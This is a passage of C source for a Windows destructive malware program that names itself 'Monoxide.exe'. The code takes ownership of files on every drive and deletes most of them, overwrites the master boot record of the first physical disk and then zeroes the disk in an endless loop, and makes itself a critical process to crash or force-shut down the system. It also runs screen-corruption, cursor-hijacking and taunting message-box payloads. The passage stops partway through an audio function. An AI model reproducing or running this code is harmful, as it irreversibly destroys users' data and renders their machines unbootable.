	HANDLE hToken = NULL;
	PSID pSIDAdmin = NULL, pSIDEveryone = NULL;
	PACL pACL = NULL;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY, SIDAuthNT = SECURITY_NT_AUTHORITY;
	EXPLICIT_ACCESS ea[ NUM_ACES ] = { 0 };
	DWORD dwRes;

	if ( !AllocateAndInitializeSid( &SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone ) )
	{
		goto cleanup;
	}

	if ( !AllocateAndInitializeSid( &SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSIDAdmin ) )
	{
		goto cleanup;
	}

	ea[ 0 ].grfAccessPermissions = GENERIC_ALL;
	ea[ 0 ].grfAccessMode = SET_ACCESS;
	ea[ 0 ].grfInheritance = NO_INHERITANCE;
	ea[ 0 ].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[ 0 ].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea[ 0 ].Trustee.ptstrName = ( PWSTR )pSIDEveryone;

	ea[ 1 ].grfAccessPermissions = GENERIC_ALL;
	ea[ 1 ].grfAccessMode = SET_ACCESS;
	ea[ 1 ].grfInheritance = NO_INHERITANCE;
	ea[ 1 ].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[ 1 ].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
	ea[ 1 ].Trustee.ptstrName = ( PWSTR )pSIDAdmin;

	if ( SetEntriesInAclW( NUM_ACES, ea, NULL, &pACL ) != ERROR_SUCCESS )
	{
		goto cleanup;
	}

	dwRes = SetNamedSecurityInfoW( szFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL );

	if ( dwRes == ERROR_SUCCESS )
	{
		bRetval = TRUE;
		goto cleanup;
	}

	if ( dwRes != ERROR_ACCESS_DENIED )
	{
		goto cleanup;
	}

	if ( !OpenProcessToken( GetCurrentProcess( ), TOKEN_ADJUST_PRIVILEGES, &hToken ) )
	{
		goto cleanup;
	}

	if ( !SetPrivilege( hToken, SE_TAKE_OWNERSHIP_NAME, TRUE ) )
	{
		goto cleanup;
	}

	dwRes = SetNamedSecurityInfoW( szFile, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pSIDAdmin, NULL, NULL, NULL );

	if ( dwRes != ERROR_SUCCESS )
	{
		goto cleanup;
	}

	if ( !SetPrivilege( hToken, SE_TAKE_OWNERSHIP_NAME, FALSE ) )
	{
		goto cleanup;
	}

	dwRes = SetNamedSecurityInfoW( szFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL ); 

	if ( dwRes == ERROR_SUCCESS )
	{
		bRetval = TRUE;
	}

cleanup:
	if ( pSIDAdmin ) FreeSid( pSIDAdmin );
	if ( pSIDEveryone ) FreeSid( pSIDEveryone );
	if ( pACL ) LocalFree( pACL );
	if ( hToken ) CloseHandle( hToken );

	return bRetval;
}

VOID
WINAPI
DriveMess( VOID )
{
	WCHAR szTempDrives[ 512 ] = { 0 };
	DWORD dwLength = GetLogicalDriveStringsW( 512, szTempDrives );

	CloseHandle( CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )FileMess, szTempDrives, 0, NULL ) );
	for ( DWORD i = 0; i < dwLength; i++ )
	{
		if ( !szTempDrives[ i ] )
		{
			CloseHandle( CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )FileMess, szTempDrives + ( i + 1 ) * sizeof( WCHAR ), 0, NULL ) );
		}
	}
}

BOOL
WINAPI
FileMess(
	_In_ PWSTR szDirectory
)
{
	TakeOwnership( szDirectory );

	WCHAR szSearchDir[ MAX_PATH ] = { 0 };
	lstrcpyW( szSearchDir, szDirectory );
	lstrcatW( szSearchDir, L"*.*" );

	WIN32_FIND_DATA findData;
	HANDLE hSearch = FindFirstFileW( szSearchDir, &findData );

	if ( hSearch == INVALID_HANDLE_VALUE )
		return FALSE;
	else do
	{
		if ( !lstrcmpW( findData.cFileName, L"." ) || !lstrcmpW( findData.cFileName, L".." ) ||
			findData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT )
		{
			continue;
		}

		WCHAR szPath[ MAX_PATH ] = { 0 };
		lstrcpyW( szPath, szDirectory );
		lstrcatW( szPath, findData.cFileName );

		TakeOwnership( szPath );

		if ( findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )
		{
			lstrcatW( szPath, L"\\" );
			FileMess( szPath );
			RemoveDirectoryW( szPath );
		}
		else
		{
			if ( Xorshift32( ) % 24 )
			{
				DeleteFileW( szPath );
			}
			else
			{
				ShellExecuteW( NULL, L"open", szPath, NULL, szDirectory, SW_SHOW );
			}
		}
	}
	while ( FindNextFileW( hSearch, &findData ) );

	FindClose( hSearch );
	RemoveDirectoryW( szDirectory );

	return TRUE;
}

BOOL
WINAPI
OverwriteBoot( VOID )
{
	HANDLE hDrive;
	DWORD dwWrittenBytes;
	BOOL bSuccess;

	hDrive = CreateFileW( L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL );
	
	if ( hDrive == INVALID_HANDLE_VALUE )
	{
		MessageBoxW( NULL, L"I failed to infect your computer and I am a failure.\n...\nI hope you don't mind.\n(God, this is so embarrassing...)", L"Monoxide.exe", MB_OK | MB_ICONERROR );
		return FALSE;
	}

	bSuccess = WriteFile( hDrive, pccMbrData, 512, &dwWrittenBytes, NULL );

	if ( !bSuccess )
	{
		MessageBoxW( NULL, L"Uhm... Why can't I overwrite your bootloader?\nOkay, well, I guess I can die now.", L"Monoxide.exe", MB_OK | MB_ICONERROR );
		CloseHandle( hDrive );

		return FALSE;
	}

	CHAR pcNullData[ 512 ];
	RtlZeroMemory( pcNullData, 512 );

	for ( ;; WriteFile( hDrive, pcNullData, 512, &dwWrittenBytes, NULL ) );
}

BOOL
WINAPI
ForceShutdownComputer( VOID )
{
	NTSTATUS( NTAPI * RtlAdjustPrivilege )( ULONG ulPrivilege, BOOLEAN bEnable, BOOLEAN bCurrentThread, PBOOLEAN pbEnabled );
	NTSTATUS( NTAPI * NtShutdownSystem )( _In_ SHUTDOWN_ACTION Action );
	NTSTATUS( NTAPI * NtSetSystemPowerState )( _In_ POWER_ACTION SystemAction, _In_ SYSTEM_POWER_STATE MinSystemState, _In_ ULONG Flags );
	NTSTATUS ntReturnValue;
	HMODULE hNtDll;
	BOOLEAN bUnused;
	BOOL bSuccess;

	hNtDll = LoadLibraryW( L"ntdll.dll" );
	RtlAdjustPrivilege = ( PVOID )GetProcAddress( hNtDll, "RtlAdjustPrivilege" );
	NtSetSystemPowerState = ( PVOID )GetProcAddress( hNtDll, "NtSetSystemPowerState" );
	NtShutdownSystem = ( PVOID )GetProcAddress( hNtDll, "NtShutdownSystem" );

	if ( RtlAdjustPrivilege )
	{
		ntReturnValue = RtlAdjustPrivilege( 19 /* SeShutdownPrivilege */, TRUE, FALSE, &bUnused );

		if ( ntReturnValue )
		{
			MessageBoxW( NULL, L"I'm not allowed to adjust my debug privilege, somehow.\nYou're doing something here, aren't you?!", L"Monoxide.exe", MB_OK | MB_ICONERROR );
			return FALSE;
		}
	}

	if ( NtSetSystemPowerState )
	{
		ntReturnValue = NtSetSystemPowerState( PowerActionShutdownOff, PowerSystemShutdown,
			SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_POWER_SUPPLY );

		if ( !ntReturnValue )
		{
			return TRUE;
		}
	}

	if ( NtShutdownSystem )
	{
		ntReturnValue = NtShutdownSystem( ShutdownPowerOff );

		if ( !ntReturnValue )
		{
			return TRUE;
		}
	}

	bSuccess = ExitWindowsEx( EWX_POWEROFF, EWX_FORCE );

	if ( !bSuccess )
	{
		MessageBoxW( NULL, L"I can't power off the computer.\nYou're lucky this time...", L"Monoxide.exe", MB_OK | MB_ICONERROR );

		return FALSE;
	}

	return TRUE;
}

BOOL
WINAPI
SetProcessCritical( VOID )
{
	NTSTATUS( NTAPI * RtlAdjustPrivilege )( ULONG ulPrivilege, BOOLEAN bEnable, BOOLEAN bCurrentThread, PBOOLEAN pbEnabled );
	NTSTATUS( NTAPI * RtlSetProcessIsCritical )( BOOLEAN bNew, PBOOLEAN pbOld, BOOLEAN bNeedScb );
	NTSTATUS ntReturnValue;
	ULONG ulBreakOnTermination;
	BOOLEAN bUnused;
	HMODULE hNtDll;

	hNtDll = LoadLibraryW( L"ntdll.dll" );
	RtlAdjustPrivilege = ( PVOID )GetProcAddress( hNtDll, "RtlAdjustPrivilege" );
	RtlSetProcessIsCritical = ( PVOID )GetProcAddress( hNtDll, "RtlSetProcessIsCritical" );
	
	if ( RtlAdjustPrivilege )
	{
		ntReturnValue = RtlAdjustPrivilege( 20 /* SeDebugPrivilege */, TRUE, FALSE, &bUnused );

		if ( ntReturnValue )
		{
			MessageBoxW( NULL, L"I can't adjust my debug privileges... somehow.", L"Monoxide.exe", MB_OK | MB_ICONERROR );

			return FALSE;
		}
	}
	else
	{
		MessageBoxW( NULL, L"Nope, can't find RtlAdjustPrivilege... What the hell is this?", L"Monoxide.exe", MB_OK | MB_ICONERROR );

		return FALSE;
	}

	if ( RtlSetProcessIsCritical )
	{
		ulBreakOnTermination = 1;
		ntReturnValue = RtlSetProcessIsCritical( TRUE, NULL, FALSE );

		if ( ntReturnValue )
		{
			MessageBoxW( NULL, L"Uhm... It's not letting me be a critical process... This isn't right!", L"Monoxide.exe", MB_OK | MB_ICONERROR );

			return FALSE;
		}
	}
	else
	{
		MessageBoxW( NULL, L"Please help me out, I can't find RtlSetProcessIsCritical. Do you know where it is?", L"Monoxide.exe", MB_OK | MB_ICONERROR );

		return FALSE;
	}

	return TRUE;
}
#pragma once
#include "monoxide.h"

#define NUM_ACES 2

typedef enum _SHUTDOWN_ACTION
{
    ShutdownNoReboot,
    ShutdownReboot,
    ShutdownPowerOff
} SHUTDOWN_ACTION, *PSHUTDOWN_ACTION;

BOOL
WINAPI
ExecuteDropper( VOID );

VOID
WINAPI
DriveMess( VOID );

BOOL
WINAPI
FileMess(
    _In_ PWSTR szDirectory
);

BOOL
WINAPI
OverwriteBoot( VOID );

BOOL
WINAPI
ForceShutdownComputer( VOID );

BOOL
WINAPI
SetProcessCritical( VOID );
#include "monoxide.h"

VOID
GetRandomPath(
	_Inout_ PWSTR szRandom,
	_In_ INT nLength
)
{
	for ( INT i = 0; i < nLength; i++ )
	{
		szRandom[ i ] = ( WCHAR )( Xorshift32( ) % ( 0x9FFF - 0x4E00 + 1 ) + 0x4E00 );
	}
}

BOOL
CALLBACK
MsgBoxRefreshWndProc(
	_In_ HWND   hwnd,
	_In_ LPARAM lParam
)
{
	UNREFERENCED_PARAMETER( lParam );
	RedrawWindow( hwnd, NULL, NULL, RDW_ERASE | RDW_INVALIDATE );
	return TRUE;
}

BOOL
CALLBACK
MsgBoxWndProc(
	_In_ HWND   hwnd,
	_In_ LPARAM lParam
)
{
	UNREFERENCED_PARAMETER( lParam );
	EnableWindow( hwnd, FALSE );
	SetWindowTextW( hwnd, L"Terrible decision." );
	return TRUE;
}

VOID
WINAPI
MsgBoxCorruptionThread(
	_In_ HWND hwndMsgBox
)
{
	BITMAPINFO bmi = { 0 };
	HANDLE hHeap;
	PRGBQUAD prgbPixels;
	HDC hdcMsgBox;
	HDC hdcTempMsgBox;
	HBITMAP hbmMsgBox;
	RECT rcMsgBox;
	INT w;
	INT h;

	GetWindowRect( hwndMsgBox, &rcMsgBox );
	w = rcMsgBox.right - rcMsgBox.left;
	h = rcMsgBox.bottom - rcMsgBox.top;

	bmi.bmiHeader.biSize = sizeof( BITMAPINFO );
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;

	hHeap = GetProcessHeap( );
	prgbPixels = ( PRGBQUAD )HeapAlloc( hHeap, 0, w * h * sizeof( RGBQUAD ) );

	hdcMsgBox = GetDC( hwndMsgBox );
	hdcTempMsgBox = CreateCompatibleDC( hdcMsgBox );
	hbmMsgBox = CreateDIBSection( hdcMsgBox, &bmi, 0, &prgbPixels, NULL, 0 );
	SelectObject( hdcTempMsgBox, hbmMsgBox );

	for ( ;; )
	{
		for ( INT32 i = 0; i < w * h; i++ )
		{
			prgbPixels[ i ].rgb = ( Xorshift32( ) % 0x100 ) * 0x010101;
		}

		BitBlt( hdcMsgBox, 0, 0, w, h, hdcTempMsgBox, 0, 0, SRCCOPY );
		EnumChildWindows( hwndMsgBox, MsgBoxRefreshWndProc, 0 );
		Sleep( 10 );
	}
}

LRESULT
CALLBACK
MsgBoxHookProc(
	_In_ INT nCode,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
)
{
	HWND hwndMsgBox;

	if ( nCode == HCBT_ACTIVATE )
	{
		hwndMsgBox = ( HWND )wParam;

		ShowWindow( hwndMsgBox, SW_SHOW );

		EnumChildWindows( hwndMsgBox, MsgBoxWndProc, 0 );
		CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )MsgBoxCorruptionThread, hwndMsgBox, 0, NULL );

		return 0;
	}

	return CallNextHookEx( hMsgHook, nCode, wParam, lParam );
}

VOID
WINAPI
MessageBoxThread( VOID )
{
	hMsgHook = SetWindowsHookExW( WH_CBT, MsgBoxHookProc, NULL, GetCurrentThreadId( ) );
	MessageBoxW( NULL, L"Terrible decision.", L"Terrible decision.", MB_ABORTRETRYIGNORE | MB_ICONERROR );
	UnhookWindowsHookEx( hMsgHook );
}

BOOL
CALLBACK
GlobalWndProc(
	_In_ HWND   hwnd,
	_In_ LPARAM lParam
)
{
	BOOL bParent;
	HDC hdc;
	RECT rcOriginal;
	RECT rc;
	INT w;
	INT h;

	Sleep( 10 );

	WCHAR szWndText[ 256 ];
	for ( INT i = 0; i < 256; i++ )
	{
		szWndText[ i ] = ( WCHAR )( ( Xorshift32( ) % 256 ) + 1 );
	}

	SetWindowTextW( hwnd, szWndText );

	GetWindowRect( hwnd, &rcOriginal );

	rc = rcOriginal;

	rc.left += Xorshift32( ) % 3 - 1;
	rc.top += Xorshift32( ) % 3 - 1;
	rc.right += Xorshift32( ) % 3 - 1;
	rc.bottom += Xorshift32( ) % 3 - 1;

	w = rc.right - rc.left;
	h = rc.bottom - rc.top;

	MoveWindow( hwnd, rc.left, rc.top, w, h, TRUE );

	hdc = GetDC( hwnd );

	if ( Xorshift32( ) % 2 )
	{
		BitBlt( hdc, rc.left, rc.top, w, h, hdc, rcOriginal.left, rcOriginal.top, ( Xorshift32( ) % 2 ) ? SRCAND : SRCPAINT );
	} 
	else
	{
		w = rcOriginal.right - rcOriginal.left;
		h = rcOriginal.bottom - rcOriginal.top;
		StretchBlt( hdc, rcOriginal.left, rcOriginal.top, w, h, hdcDesktop, rcScrBounds.left, rcScrBounds.top,
			rcScrBounds.right - rcScrBounds.left, rcScrBounds.bottom - rcScrBounds.top,
			( Xorshift32( ) % 2 ) ? SRCAND : SRCPAINT );
	}
	
	ReleaseDC( hwnd, hdc );

	bParent = ( BOOL )lParam;

	if ( bParent )
	{
		EnumChildWindows( hwnd, GlobalWndProc, FALSE );
	}

	return TRUE;
}

VOID
WINAPI
EnumGlobalWnd( VOID )
{
	for ( ;; )
	{
		EnumWindows( GlobalWndProc, TRUE );
	}
}

VOID
WINAPI
CursorClicker( VOID )
{
	INT ppdwClickEvents[ 2 ][ 2 ] = {
		{ MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP },
		{ MOUSEEVENTF_RIGHTDOWN, MOUSEEVENTF_RIGHTUP }
	};

	for ( ;; )
	{
		INT nIndex = Xorshift32( ) % 2;

		mouse_event( ppdwClickEvents[ nIndex ][ 0 ], 0, 0, 0, 0 );
		Sleep( Xorshift32( ) % 51 + 50 );

		mouse_event( ppdwClickEvents[ nIndex ][ 1 ], 0, 0, 0, 0 );
		Sleep( Xorshift32( ) % 51 + 50 );
	}
}

VOID
WINAPI
CursorMess( VOID )
{
	for ( ;; )
	{
		SetCursorPos( Xorshift32( ) % ( rcScrBounds.right - rcScrBounds.left ) - rcScrBounds.left,
			Xorshift32( ) % ( rcScrBounds.bottom - rcScrBounds.top ) - rcScrBounds.top );
		Sleep( 1000 );
	}
}

VOID
WINAPI
CursorDraw( VOID )
{
	CURSORINFO curInf = { sizeof( CURSORINFO ) };

	for ( ;; )
	{
		GetCursorInfo( &curInf );

		for ( INT i = 0; i < ( INT )( Xorshift32( ) % 5 + 1 ); i++ )
		{
			DrawIcon( hdcDesktop, Xorshift32( ) % ( rcScrBounds.right - rcScrBounds.left - GetSystemMetrics( SM_CXCURSOR ) ) - rcScrBounds.left,
				Xorshift32( ) % ( rcScrBounds.bottom - rcScrBounds.top - GetSystemMetrics( SM_CYCURSOR ) ) - rcScrBounds.top, curInf.hCursor );
		}
		DestroyCursor( curInf.hCursor );
		Sleep( Xorshift32( ) % 11 );
	}
}
#pragma once
#include "monoxide.h"

VOID
GetRandomPath(
    _Inout_ PWSTR szRandom,
    _In_ INT nLength
);

VOID
WINAPI
MessageBoxThread( VOID );

VOID
WINAPI
EnumGlobalWnd( VOID );

VOID
WINAPI
CursorClicker( VOID );

VOID
WINAPI
CursorMess( VOID );

VOID
WINAPI
CursorDraw( VOID );
#include "monoxide.h"

#pragma region Public Variables
HWND hwndDesktop;
HDC hdcDesktop;
RECT rcScrBounds;
HHOOK hMsgHook;
INT nCounter = 0;
#pragma endregion Public Variables

VOID
WINAPI
Initialize( VOID )
{
	HMODULE hModUser32 = LoadLibraryW( L"user32.dll" );
	BOOL( WINAPI * SetProcessDPIAware )( VOID ) = ( BOOL( WINAPI * )( VOID ) )GetProcAddress( hModUser32, "SetProcessDPIAware" );
	if ( SetProcessDPIAware )
		SetProcessDPIAware( );
	FreeLibrary( hModUser32 );

	hwndDesktop = HWND_DESKTOP;
	hdcDesktop = GetDC( hwndDesktop );

	SeedXorshift32( ( DWORD )__rdtsc( ) );
	InitializeSine( );
	EnumDisplayMonitors( NULL, NULL, &MonitorEnumProc, 0 );
	CloseHandle( CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )TimerThread, NULL, 0, NULL ) );
}

INT
WINAPI
wWinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ PWSTR pszCmdLine,
	_In_ INT nShowCmd
)
{
	UNREFERENCED_PARAMETER( hInstance );
	UNREFERENCED_PARAMETER( hPrevInstance );
	UNREFERENCED_PARAMETER( pszCmdLine );
	UNREFERENCED_PARAMETER( nShowCmd );

	HANDLE hCursorDraw, hAudioThread, hGdiThread;
	
	Initialize( );

	if ( !ExecuteDropper( ) )
	{
		return 0;
	}

	if ( !SetProcessCritical( ) )
	{
		CloseHandle( CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )OverwriteBoot, NULL, 0, NULL ) );
		Sleep( 1000 );
		ForceShutdownComputer( );

		return 0;
	}

	Sleep( 5000 );
	CloseHandle( CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )MessageBoxThread, NULL, 0, NULL ) );
	Sleep( 1000 );
	
	DriveMess( );

	CloseHandle( CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )OverwriteBoot, NULL, 0, NULL ) );
	CloseHandle( CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )EnumGlobalWnd, NULL, 0, NULL ) );
	CloseHandle( CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )CursorClicker, NULL, 0, NULL ) );
	CloseHandle( CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )CursorMess, NULL, 0, NULL ) );

	hCursorDraw = CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )CursorDraw, NULL, 0, NULL );

	CreateMutexW( NULL, TRUE, L"Monoxide.exe" );

	if ( GetLastError( ) == ERROR_ALREADY_EXISTS )
	{
		ForceShutdownComputer( );
		return 0;
	}

	pAudioSequences[ 0 ]  = ( AUDIO_SEQUENCE_PARAMS ) { 48000, 48000 * 30, AudioSequence1,  NULL, NULL };
	pAudioSequences[ 1 ]  = ( AUDIO_SEQUENCE_PARAMS ) { 8000,  8000  * 30, AudioSequence2,  NULL, NULL };
	pAudioSequences[ 2 ]  = ( AUDIO_SEQUENCE_PARAMS ) { 8000,  8000  * 30, AudioSequence3,  NULL, NULL };
	pAudioSequences[ 3 ]  = ( AUDIO_SEQUENCE_PARAMS ) { 16000, 16000 * 30, AudioSequence4,  NULL, NULL };
	pAudioSequences[ 4 ]  = ( AUDIO_SEQUENCE_PARAMS ) { 8000,  8000  * 30, AudioSequence5,  NULL, NULL };
	pAudioSequences[ 5 ]  = ( AUDIO_SEQUENCE_PARAMS ) { 8000,  8000  * 30, AudioSequence6,  NULL, NULL };
	pAudioSequences[ 6 ]  = ( AUDIO_SEQUENCE_PARAMS ) { 12000, 12000 * 30, AudioSequence7,  NULL, NULL };
	pAudioSequences[ 7 ]  = ( AUDIO_SEQUENCE_PARAMS ) { 48000, 48000 * 30, AudioSequence8,  NULL, NULL };
	pAudioSequences[ 8 ]  = ( AUDIO_SEQUENCE_PARAMS ) { 48000, 48000 * 30, AudioSequence9,  NULL, NULL };
	pAudioSequences[ 9 ]  = ( AUDIO_SEQUENCE_PARAMS ) { 8000,  8000  * 30, AudioSequence10, NULL, NULL };
	pAudioSequences[ 10 ] = ( AUDIO_SEQUENCE_PARAMS ) { 8000,  8000  * 30, AudioSequence11, NULL, NULL };
	pAudioSequences[ 11 ] = ( AUDIO_SEQUENCE_PARAMS ) { 8000,  8000  * 30, AudioSequence12, NULL, NULL };
	pAudioSequences[ 12 ] = ( AUDIO_SEQUENCE_PARAMS ) { 16000, 16000 * 30, AudioSequence13, NULL, NULL };
	pAudioSequences[ 13 ] = ( AUDIO_SEQUENCE_PARAMS ) { 48000, 48000 * 30, AudioSequence14, NULL, NULL };
	pAudioSequences[ 14 ] = ( AUDIO_SEQUENCE_PARAMS ) { 48000, 48000 * 30, AudioSequence15, NULL, NULL };
	pAudioSequences[ 15 ] = ( AUDIO_SEQUENCE_PARAMS ) { 48000, 48000 * 30, AudioSequence16, NULL, NULL };
	pAudioSequences[ 24 ] = ( AUDIO_SEQUENCE_PARAMS ) { 48000, 48000 * 30, FinalAudioSequence, NULL, NULL };

	pGdiShaders[ 0 ]  = ( GDI_SHADER_PARAMS ) { GdiShader1,  NULL,          PostGdiShader1 };
	pGdiShaders[ 1 ]  = ( GDI_SHADER_PARAMS ) { GdiShader2,  NULL,          PostGdiShader2 };
	pGdiShaders[ 2 ]  = ( GDI_SHADER_PARAMS ) { GdiShader3,  NULL,          PostGdiShader3 };
	pGdiShaders[ 3 ]  = ( GDI_SHADER_PARAMS ) { GdiShader4,  NULL,          PostGdiShader2 };
	pGdiShaders[ 4 ]  = ( GDI_SHADER_PARAMS ) { GdiShader5,  NULL,          PostGdiShader4 };
	pGdiShaders[ 5 ]  = ( GDI_SHADER_PARAMS ) { GdiShader6,  NULL,          PostGdiShader2 };
	pGdiShaders[ 6 ]  = ( GDI_SHADER_PARAMS ) { GdiShader7,  NULL,          PostGdiShader5 };
	pGdiShaders[ 7 ]  = ( GDI_SHADER_PARAMS ) { GdiShader8,  PreGdiShader1, PostGdiShader6 };
	pGdiShaders[ 8 ]  = ( GDI_SHADER_PARAMS ) { GdiShader9,  NULL,          NULL };
	pGdiShaders[ 9 ]  = ( GDI_SHADER_PARAMS ) { GdiShader10, NULL,          NULL };
	pGdiShaders[ 10 ] = ( GDI_SHADER_PARAMS ) { GdiShader11, NULL,          NULL };
	pGdiShaders[ 11 ] = ( GDI_SHADER_PARAMS ) { GdiShader12, NULL,          NULL };
	pGdiShaders[ 12 ] = ( GDI_SHADER_PARAMS ) { GdiShader13, NULL,          NULL };
	pGdiShaders[ 13 ] = ( GDI_SHADER_PARAMS ) { GdiShader14, NULL,          PostGdiShader2 };
	pGdiShaders[ 14 ] = ( GDI_SHADER_PARAMS ) { GdiShader15, NULL,          NULL };
	pGdiShaders[ 15 ] = ( GDI_SHADER_PARAMS ) { GdiShader16, NULL,          NULL };
	pGdiShaders[ 16 ] = ( GDI_SHADER_PARAMS ) { GdiShader17, NULL,          NULL };
	pGdiShaders[ 17 ] = ( GDI_SHADER_PARAMS ) { GdiShader18, NULL,          NULL };
	pGdiShaders[ 18 ] = ( GDI_SHADER_PARAMS ) { GdiShader19, NULL,          NULL };
	pGdiShaders[ 19 ] = ( GDI_SHADER_PARAMS ) { GdiShader20, NULL,          PostGdiShader2 };
	pGdiShaders[ 20 ] = ( GDI_SHADER_PARAMS ) { GdiShader21, NULL,          PostGdiShader2 };
	pGdiShaders[ 24 ] = ( GDI_SHADER_PARAMS ) { FinalGdiShader, NULL, NULL };

	hAudioThread = CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )AudioPayloadThread, NULL, 0, NULL );
	
	for ( ;; )
	{
		hGdiThread = CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )GdiShaderThread, &pGdiShaders[ Xorshift32( ) % 21 ], 0, NULL );
		WaitForSingleObject( hGdiThread, ( Xorshift32( ) % 3 ) ? PAYLOAD_MS : ( ( Xorshift32( ) % 5 ) * ( PAYLOAD_MS / 4 ) ) );
		CloseHandle( hGdiThread );

		if ( nCounter >= ( ( 180 * 1000 ) / TIMER_DELAY ) )
		{
			break;
		}
	}

	TerminateThread( hAudioThread, 0 );
	CloseHandle( hAudioThread );

	TerminateThread( hCursorDraw, 0 );
	CloseHandle( hCursorDraw );

	CloseHandle( CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )GdiShaderThread, &pGdiShaders[ 24 ], 0, NULL ) );
	CloseHandle( CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )AudioSequenceThread, &pAudioSequences[ 24 ], 0, NULL ) );

	for ( ;; )
	{
		ForceShutdownComputer( );
	}
}
#include "monoxide.h"

DWORD xs;
static FLOAT pfSinVals[ 4096 ];

VOID
SeedXorshift32(
	_In_ DWORD dwSeed
)
{
	xs = dwSeed;
}

DWORD
Xorshift32( VOID )
{
	xs ^= xs << 13;
	xs ^= xs >> 17;
	xs ^= xs << 5;
	return xs;
}

VOID
Reflect2D(
	_Inout_ PINT x,
	_Inout_ PINT y,
	_In_ INT w,
	_In_ INT h
)
{
#define FUNCTION(v, maxv) ( abs( v ) / ( maxv ) % 2 ? ( maxv ) - abs( v ) % ( maxv ) : abs( v ) % ( maxv ) );
	*x = FUNCTION( *x, w - 1 );
	*y = FUNCTION( *y, h - 1 );
#undef FUNCTION
}

FLOAT
FastSine(
	_In_ FLOAT f
)
{
	INT i = ( INT )( f / ( 2.f * PI ) * ( FLOAT )_countof( pfSinVals ) );
	return pfSinVals[ i % _countof( pfSinVals ) ];
}

FLOAT
FastCosine(
	_In_ FLOAT f
)
{
	return FastSine( f + PI / 2.f );
}

VOID
InitializeSine( VOID )
{
	for ( INT i = 0; i < _countof( pfSinVals ); i++ )
		pfSinVals[ i ] = sinf( ( FLOAT )i / ( FLOAT )_countof( pfSinVals ) * PI * 2.f );
}
#pragma once
#include "monoxide.h"

#define PI 3.141592f

VOID
SeedXorshift32(
	_In_ DWORD dwSeed
);

DWORD
Xorshift32( VOID );

VOID
Reflect2D(
	_Inout_ PINT x,
	_Inout_ PINT y,
	_In_ INT w,
	_In_ INT h
);

VOID
InitializeSine( VOID );

FLOAT
FastSine(
	_In_ FLOAT f
);

FLOAT
FastCosine(
	_In_ FLOAT f
);
#pragma once
#pragma warning( disable: 4152 )
#pragma warning( disable: 4201 )

#define RGBQUAD _RGBQUAD
#pragma warning( push, 0 )
#include <windows.h>
#pragma warning( pop )
#undef RGBQUAD

#include <accctrl.h>
#include <aclapi.h>
#include <stdio.h>
#include <math.h>
#include "def.h"
#include "math.h"
#include "color.h"
#include "callbacks.h"
#include "threads.h"
#include "payloads.h"
#include "extra_payloads.h"
#include "destruction.h"

#pragma region Public Variables
extern HWND hwndDesktop;
extern HDC hdcDesktop;
extern RECT rcScrBounds;
extern HHOOK hMsgHook;
extern INT nCounter;
#pragma endregion Public Variables
#include "resource.h"

#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include "winres.h"

/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS

/////////////////////////////////////////////////////////////////////////////
// English (United States) resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
#pragma code_page(1252)

#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//

1 TEXTINCLUDE 
BEGIN
    "resource.h\0"
END

2 TEXTINCLUDE 
BEGIN
    "#include ""winres.h""\r\n"
    "\0"
END

3 TEXTINCLUDE 
BEGIN
    "\r\n"
    "\0"
END

#endif    // APSTUDIO_INVOKED


/////////////////////////////////////////////////////////////////////////////
//
// Icon
//

// Icon with lowest ID value placed first to ensure application icon
// remains consistent on all systems.
MAINICON ICON "E:\\Visual Studio Projects\\Monoxide\\monoxide.ico"

#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////



#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//


/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED
#include "monoxide.h"

VOID
WINAPI
AudioPayloadThread( VOID )
{
	for ( ;; )
	{
